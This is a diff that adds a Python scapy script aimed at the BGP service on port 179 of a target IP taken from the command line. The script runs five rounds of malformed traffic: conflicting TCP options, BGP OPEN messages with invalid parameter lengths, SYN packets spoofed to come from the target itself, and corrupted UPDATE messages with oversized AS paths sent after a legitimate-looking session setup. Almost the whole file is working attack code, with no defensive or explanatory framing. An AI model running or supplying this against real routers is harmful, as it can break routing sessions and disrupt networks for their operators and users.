@@ -1,0 +1,97 @@
+from scapy.all import *
+from scapy.contrib.bgp import *
+import random
+import time
+import logging
+
+logging.basicConfig(filename='logss.log', level=logging.INFO, format='%(asctime)s - %(message)s')
+
+def forge_conflict_tcp_options():
+    return [
+        ('MSS', 1460),
+        ('WScale', 15),
+        ('Timestamp', (random.randint(100000, 999999), 0)),
+        ('SACKOK', b''),
+        ('NOP', None),
+        ('WScale', 0),
+        ('Timestamp', (0, 0)),
+        ('EOL', None)
+    ]
+
+def send_syn_inversion(ip_dst, port=179):
+    ip = IP(dst=ip_dst, src=ip_dst)
+    tcp = TCP(sport=179, dport=RandShort(), flags='S', seq=12345)
+    pkt = ip/tcp
+    send(pkt, verbose=0)
+    logging.info("[SYN INVERSION] Sent SYN from target IP as if initiating a connection back.")
+
+def send_trusted_session_corruptor(ip_dst, port=179):
+    ip = IP(dst=ip_dst)
+    sport = RandShort()
+    syn = TCP(sport=sport, dport=port, flags='S', seq=1000)
+    syn_ack = sr1(ip/syn, timeout=3, verbose=0)
+    if not syn_ack or syn_ack[TCP].flags != 'SA':
+        logging.info("[TRUSTED CORRUPT] No SYN-ACK.")
+        return
+
+    ack = TCP(sport=sport, dport=port, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
+    send(ip/ack, verbose=0)
+
+    # Step 1: Legit OPEN
+    open_pkt = BGPHeader(type=1)/BGPOpen(
+        version=4,
+        my_as=64512,
+        hold_time=90,
+        bgp_id="1.2.3.4",
+        opt_param_len=0
+    )
+    send(ip/TCP(sport=sport, dport=port, flags='PA', seq=ack.seq, ack=ack.ack)/open_pkt, verbose=0)
+
+    # Step 2: Legit KEEPALIVE
+    keepalive = BGPHeader(type=4)
+    send(ip/TCP(sport=sport, dport=port, flags='PA', seq=ack.seq + len(open_pkt), ack=ack.ack)/keepalive, verbose=0)
+
+    # Step 3: Corrupted UPDATE pretending to be legit
+    as_path = b'\x02\x01\xFF' * 100  # Path segment too long
+    update = BGPHeader(type=2)/Raw(load=as_path)
+    send(ip/TCP(sport=sport, dport=port, flags='PA', seq=ack.seq + len(open_pkt) + len(keepalive), ack=ack.ack)/update, verbose=0)
+    logging.info("[TRUSTED CORRUPT] Sent corrupted UPDATE after trusted session init.")
+
+def run_codex_hydra_assault(dst_ip):
+    for round_id in range(5):
+        print(f"[🔥] tessts {round_id + 1}/5")
+
+        # TCP Option Desync Injection
+        ip = IP(dst=dst_ip)
+        sport = RandShort()
+        syn = TCP(sport=sport, dport=179, flags='S', seq=1000, options=forge_conflict_tcp_options())
+        syn_ack = sr1(ip/syn, timeout=2, verbose=0)
+
+        if not syn_ack or syn_ack[TCP].flags != 'SA':
+            logging.info(f"[{round_id}] No SYN-ACK (desync)")
+            continue
+
+        ack = TCP(sport=sport, dport=179, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
+        send(ip/ack, verbose=0)
+
+        # Desync: OPEN with wrong opt_param_len
+        open_payload = BGPHeader(type=1)/Raw(load=bytes([
+            4, 0xFC, 0x00, 0x00, 0x5A, 1, 2, 3, 4, 20  # opt_len=20, no TLVs
+        ]))
+        send(ip/TCP(sport=sport, dport=179, flags='PA', seq=ack.seq, ack=ack.ack)/open_payload, verbose=0)
+        logging.info(f"[{round_id}] Sent OPEN with invalid opt_param_len (desync)")
+
+        time.sleep(1)
+
+        # SYN Inversion + Trusted Corruptor
+        send_syn_inversion(dst_ip)
+        send_trusted_session_corruptor(dst_ip)
+
+        time.sleep(2)
+
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) != 2:
+        print("Usage: sudo python3 tessts.py <target_ip>")
+        sys.exit(1)
+    run_codex_hydra_assault(sys.argv[1])
